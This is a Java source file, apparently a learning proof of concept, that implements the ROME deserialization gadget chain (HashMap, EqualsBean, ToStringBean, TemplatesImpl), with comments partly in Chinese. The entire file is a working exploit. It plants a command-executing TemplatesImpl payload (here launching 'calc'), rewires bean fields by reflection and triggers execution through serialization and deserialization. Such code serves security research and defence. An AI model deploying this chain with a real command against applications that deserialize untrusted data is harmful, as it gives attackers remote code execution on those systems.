package gadget.rome;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import javassist.CannotCompileException;
import javassist.NotFoundException;
import util.GadgetUtils;
import util.ReflectionUtils;

import javax.xml.transform.Templates;
import java.io.*;
import java.util.HashMap;

/*
* HashMap#readObject
* HashMap#hash
* EqualsBean#hashCode
* ToStringBean#toString
* TemplatesImpl-->getOutputProperties()
	TemplatesImpl-->newTransformer()
        TemplatesImpl-->getTransletInstance()
            TemplatesImpl-->defineTransletClasses()
                TemplatesImpl-->defineClass()
* */

public class rome1 {
    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, InstantiationException, IllegalAccessException, ClassNotFoundException {

        TemplatesImpl templates = GadgetUtils.createTemplatesImpl("calc");
//        templates.getOutputProperties();
        ToStringBean toStringBean = new ToStringBean(Templates.class,templates);
//        toStringBean.toString();
        EqualsBean equalsBean = new EqualsBean(String.class,"1");
//        equalsBean.hashCode();
        ObjectBean objectBean = new ObjectBean(String.class, "1");       //这里写一个正常的类

        HashMap<Object, Integer> hashMap = new HashMap<>();
        hashMap.put(equalsBean,1);
        ReflectionUtils.setFieldValue(equalsBean,"_beanClass",ToStringBean.class);     //反射将恶意类写进去
        ReflectionUtils.setFieldValue(equalsBean,"_obj",toStringBean);

        ByteArrayOutputStream baout = new ByteArrayOutputStream();
        ObjectOutputStream oout = new ObjectOutputStream(baout);
        oout.writeObject(hashMap);
        byte[] sss = baout.toByteArray();

        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(sss));
        ois.readObject();
    }

}
